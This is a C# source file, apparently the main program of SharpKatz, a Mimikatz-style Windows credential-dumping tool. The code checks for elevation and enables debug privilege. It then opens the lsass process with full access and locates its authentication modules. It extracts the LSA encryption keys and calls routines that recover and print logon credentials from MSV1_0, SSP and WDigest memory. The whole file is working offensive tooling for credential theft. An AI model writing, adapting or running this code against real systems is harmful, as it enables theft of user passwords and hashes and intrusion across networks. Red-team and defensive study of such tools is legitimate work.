﻿using SharpKatz.Credential;
using SharpKatz.Module;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;

namespace SharpKatz
{
    class Program
    {
        static void Main(string[] args)
        {
            if (IntPtr.Size != 8)
            {
                return;
            }

            if (!Utility.IsElevated())
            {
                Console.WriteLine("Run in High integrity context");
                return;
            }

            Utility.SetDebugPrivilege();

            OSVersionHelper osHelper = new OSVersionHelper();
            osHelper.PrintOSVersion();

            IntPtr lsasrv = IntPtr.Zero;
            IntPtr wdigest = IntPtr.Zero;
            IntPtr lsassmsv1 = IntPtr.Zero;
            IntPtr lsasslive = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            Process plsass = Process.GetProcessesByName("lsass")[0];

            ProcessModuleCollection processModules = plsass.Modules;

            for(int i = 0; i < processModules.Count; i++ )
            {
                if (processModules[i].ModuleName.ToLower().Contains("lsasrv.dll"))
                {
                    lsasrv = processModules[i].BaseAddress;
                }
                if (processModules[i].ModuleName.ToLower().Contains("wdigest.dll"))
                {
                    wdigest = processModules[i].BaseAddress;
                }
                if (processModules[i].ModuleName.ToLower().Contains("msv1_0.dll"))
                {
                    lsassmsv1 = processModules[i].BaseAddress;
                }
                if (processModules[i].ModuleName.ToLower().Contains("livessp.dll"))
                {
                    Console.WriteLine("Trovato");
                    lsasslive = processModules[i].BaseAddress;
                }

            }

            Console.WriteLine("lsasrv {0:X}", lsasrv);
            Console.WriteLine("wdigest {0:X}", wdigest);
            Console.WriteLine("msv1 {0:X}", lsassmsv1);

            hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);

            List<Logon> logonlist = new List<Logon>();

            Keys keys = new Keys(hProcess, lsasrv, osHelper);
            
            Type primaryCredentialType = osHelper.ListType;
            Type msv1 = typeof(Module.Msv1);
            MethodInfo msv1ModuleInfo = msv1.GetMethod("FindCredentials");
            MethodInfo msv1Constructed = msv1ModuleInfo.MakeGenericMethod(primaryCredentialType);

            object[] funargsMsv = { hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist };
            msv1Constructed.Invoke(null, funargsMsv);

            Module.Ssp.FindCredentials(hProcess, lsassmsv1, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

            Type live = typeof(Module.LiveSsp);
            MethodInfo livesspModuleInfo = live.GetMethod("FindCredentials");
            MethodInfo liveConstructed = livesspModuleInfo.MakeGenericMethod(primaryCredentialType);

            object[] funargsLive = new object[] { hProcess, lsasslive, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist };
            //liveConstructed.Invoke(null, funargsLive);

            WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

            Utility.PrintLogonList(logonlist);

        }
    }
}
